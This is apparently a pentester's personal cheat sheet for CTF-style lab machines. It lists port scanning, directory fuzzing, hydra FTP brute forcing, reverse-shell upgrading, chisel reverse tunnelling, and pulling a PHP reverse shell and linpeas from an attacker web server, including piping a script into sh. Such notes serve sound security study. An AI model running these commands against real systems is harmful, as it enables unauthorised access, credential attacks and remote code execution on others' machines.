# Common Commands I Use Frequently (In no particular order)

## Enumeration
### Port Scanning
- `IP=x.x.x.x`
- `sudo masscan -p1-65535 $IP --rate=1000 -e tun0 > ports`
- `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
- `nmap -Pn -sVC -vv -p$ports $IP`
### Web Directory Fuzzing
- `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://xxxxxx.xxx/FUZZ -fc 404,400`
### Things to do on the Target Machine Once you Have a Foothold
- List listening ports on the machine `ss -ltn`
- List all files and folders including hidden ones in a directory `ls al`

## Encryption/Decryption
### PGP
- Add an encryption key you've found to the keyring `gpg --import x.key`
- Use aforemntioned key to decrypt a file `gpg x.pdf.gpg`
### SSH
- Generate SSH keys for a user `ssh-keygen -f username`

## Login Brute Forcing
### FTP
- Use lists created by RoomPrepper (The createLists.sh script takes the users and passwords from the notes.md file and creates these lists) `hydra -L user.lst -P password.lst ftp://x.x.x.x`

## Upgrade Reverse Shell (To one that has autocomplete and won't be killed by Ctrl^C etc.)
### Using Python
1. In reverse shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. Press CTRL^Z to put the reverse shell in the background
3. In the host terminal (It should be at this stage now when the reverse shell has been backgrounded) `stty raw -echo; fg`
4. In the reverse shell that has now been foregrounded `echo TERM=xterm-256color` followed by `reset` if required

## Find files
### Find Command
- `find / 2>/dev/null | grep desired_word`

## Tunneling
### SSH
- Open an SSH session where all traffic to port 1111 on the target machine is forwarded to port 1111 on the attacking machine `ssh user@x.x.x.x -L 1111:localhost:1111`
### Chisel
1. Transfer chisel binary to target
2. Start chisel server on attacker machine `chisel server --reverse --port 9001`
3. On the target run `chisel client 10.x.x.x:9001 R:2049:127.0.0.1:2049`

## Facilitation of File Transfers Between Attacker and Target
### Python web server
1. Start a simple web server from current working directory `python3 -m http.server 8000`
  - Download a file from aforementioned simple web server `wget http://10.x.x.x:8000/revsh.php` or `curl -O http://10.x.x.x:8000/chisel`
  - Run a file from aforementioned simple web server `curl http://10.x.x.x:8000/linpeas.sh | sh`
